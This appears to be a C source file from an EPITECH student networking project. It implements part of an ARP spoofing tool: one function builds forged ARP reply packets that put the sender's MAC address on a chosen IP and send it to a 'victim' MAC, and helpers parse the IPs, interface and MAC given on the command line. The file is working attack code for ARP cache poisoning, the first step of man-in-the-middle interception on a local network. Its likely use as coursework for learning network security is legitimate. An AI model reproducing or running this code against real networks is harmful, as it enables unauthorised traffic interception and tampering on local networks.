/*
** EPITECH PROJECT, 2019
** Default
** File description:
** Default
*/

#include <arp.h>

void create_packet(struct hdr *hd, arp_t *info)
{
    memcpy(hd->ethhdr.ether_shost, info->mac, 6);
    memcpy(hd->ethhdr.ether_dhost, info->victim_mac, 6);
    hd->ethhdr.ether_type = htons(0x0806);
    memcpy(hd->etherarphdr.arp_sha, info->mac, 6);
    memcpy(hd->etherarphdr.arp_tha, info->victim_mac, 6);
    memcpy(hd->etherarphdr.arp_tpa, &info->destip, 4);
    memcpy(hd->etherarphdr.arp_spa, &info->srcip, 4);
    hd->etherarphdr.ea_hdr.ar_op = htons(ARPOP_REPLY);
    hd->etherarphdr.ea_hdr.ar_hln = 6;
    hd->etherarphdr.ea_hdr.ar_pln = 4;
    hd->etherarphdr.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    hd->etherarphdr.ea_hdr.ar_pro = htons(ETHERTYPE_IP);
}

arp_t *basic_init(char **av)
{
    arp_t *info = calloc(sizeof(arp_t), 1);

    inet_aton(av[2], (struct in_addr *)&info->destip);
    inet_aton(av[1], (struct in_addr *)&info->srcip);
    mac_eth0(info->mac, av[3]);
    return info;
}

void convert_str_to_bytes(arp_t *info, char *str)
{
    int values[6];
    int i;

    if (6 == sscanf(str, "%x:%x:%x:%x:%x:%x%*c",
        &values[0], &values[1], &values[2],
        &values[3], &values[4], &values[5]))
        for (i = 0 ; i < 6 ; ++i)
            info->victim_mac[i] = (uint8_t)values[i];
}